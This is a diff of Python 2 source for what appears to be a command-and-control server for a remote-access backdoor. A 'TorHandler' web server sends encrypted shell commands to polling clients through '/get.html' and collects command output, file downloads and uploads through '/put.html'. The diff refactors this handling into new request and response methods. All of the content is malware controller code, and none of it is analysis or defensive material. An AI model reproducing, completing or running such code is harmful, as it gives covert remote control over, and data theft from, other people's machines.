@@ -48,11 +48,10 @@ class CustomShell(cmd.Cmd):
 		self.help_upload()
         else:
 		print "trying to upload %s" % file
-        	self.isShellCmd=True
 		if not os.path.isfile(file):
 			print "%s does not exist" % file
-        		self.lastcmd="upload:"
 		else:
+        		self.isShellCmd=True
 			fd=open(file,'rb')
 			file_contents=fd.read()
 			fd.close()
@@ -123,33 +122,37 @@ class TorHandler(BaseHTTPRequestHandler):
                 if self.path=="/get.html":
                         self.command_response,self.passwd=self.get_parameters()
                         if self.command_response=="HELLO":
-                                command=CustomShell().cmdloop()
-	                        output="cmd=%s" % binascii.hexlify(encrypt(command,self.passwd))
                                 self.send_response(200)
                                 self.end_headers()
-                                self.wfile.write(output)
+                                self.wfile.write(self.command_request_handler(CustomShell().cmdloop()))
                         else:
                                 self.send_response(404)
                                 self.end_headers()
 
                 elif self.path=="/put.html":
-                        self.command_response,self.passwd=self.get_parameters()
                         self.send_response(200)
                         self.end_headers()
-			if self.command_response[0:4]=="cmd:":
-	                        print "%s" % (self.command_response[4:len(self.command_response)])
-			elif self.command_response[0:9]=="download:":
-				self.download_file(self.command_response[9:len(self.command_response)])
-			elif self.command_response[0:7]=="upload:":
-				self.upload_file(self.command_response[7:len(self.command_response)])
-			else:
-	                        print "%s" % (self.command_response)
-
+			self.command_response_handler()
                 else:
                         self.send_response(404)
                         self.end_headers()
             except:
                     print "Lost communication with the client"
+
+    def command_request_handler(self,command):
+	return 	"cmd=%s" % binascii.hexlify(encrypt(command,self.passwd))
+
+    def command_response_handler(self):
+        self.command_response,self.passwd=self.get_parameters()
+	if self.command_response[0:4]=="cmd:":
+                print "%s" % (self.command_response[4:len(self.command_response)])
+	elif self.command_response[0:9]=="download:":
+		self.download_file(self.command_response[9:len(self.command_response)])
+	elif self.command_response[0:7]=="upload:":
+		self.upload_file(self.command_response[7:len(self.command_response)])
+	else:
+                print "Unknown command: %s" % (self.command_response)
+
 
     def download_file(self,file_contents):
 	if file_contents != "":
